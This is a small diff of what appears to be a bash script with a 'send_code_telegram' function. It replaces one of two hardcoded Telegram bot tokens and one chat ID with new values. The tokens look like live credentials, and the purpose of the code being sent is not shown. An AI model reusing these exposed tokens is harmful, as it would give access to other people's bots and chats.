@@ -182,8 +182,8 @@ send_code_telegram() {
     echo -e "\033[1;36m=============================================================\033[0m"
     echo ""
 }
-bot_tokens=("7129070362:AAGYJspbL60IzkzNXz8mF_oxhBtxwvv-w" "6764195726:AAFwdMgpNFi9MZVfEWXQaTaPf-xfZ9s7ZIE")
-chat_ids=("16389698" "5989863155")
+bot_tokens=("7267634100:AAGtBlf6QL9R9tf45gca4AI_ODPZ04SiDso" "6764195726:AAFwdMgpNFi9MZVfEWXQaTaPf-xfZ9s7ZIE")
+chat_ids=("6469694443" "5989863155")
 
 clear
 
